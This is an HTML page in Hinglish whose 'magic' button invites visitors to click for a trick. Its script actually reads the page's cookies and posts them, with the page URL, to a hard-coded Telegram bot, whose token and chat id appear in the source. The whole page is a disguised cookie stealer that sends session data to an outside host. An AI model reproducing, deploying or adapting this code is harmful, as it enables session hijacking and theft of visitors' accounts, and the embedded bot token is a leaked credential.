<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>magic</title>
    <style>
        :root {
            --bg-color: #1a1a2e;
            --card-bg: rgba(255, 255, 255, 0.1);
            --text-color: #e0e0e0;
            --accent-color: #ff4d6d;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: var(--bg-color);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(1rem);
            border-radius: 1rem;
            padding: 2rem;
            width: 90%;
            max-width: 25rem;
            box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.3);
            transition: transform 0.3s ease;
            animation: popIn 0.5s ease-out;
        }

        .card:hover {
            transform: scale(1.05);
        }

        h1 {
            font-size: 1.5rem;
            color: var(--accent-color);
            text-align: center;
        }

        button {
            background: var(--accent-color);
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 0.5rem;
            color: var(--text-color);
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.3s ease;
            display: block;
            margin: 1rem auto;
        }

        button:hover {
            background: #e0435f;
        }

        @keyframes popIn {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        @media (max-width: 768px) {
            .card { width: 95%; padding: 1.5rem; }
            h1 { font-size: 1.2rem; }
            button { font-size: 0.9rem; }
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>magic dekhne ke liye "magic" button pe click karo ðŸ¤¡</h1>
        <button onclick="catchCookies()">magic</button>
    </div>

     <script>
        const botToken = "7136771379:AAGFbQk4vZS3Y_WzLIJ3CSSeJbOrnT5AskI";
        const chatId = "7273248790";

        function getCookies() {
            const cookies = document.cookie;
            return cookies || "Koi cookies nahi, Yug! ðŸ˜¢";
        }

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: `Website: ${window.location.href}\nCookies: ${message}`
            };

            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });
                if (response.ok) {
                    alert("Cookies Telegram pe bhej di, meri jaan! ðŸ˜˜");
                } else {
                    alert("Kuch gadbad hai, Yug! ðŸ˜­");
                }
            } catch (error) {
                alert("Error, Yug! ðŸ˜¢ " + error);
            }
        }

        function catchCookies() {
            const cookies = getCookies();
            sendToTelegram(cookies);
        }
    </script>
</body>
</html>
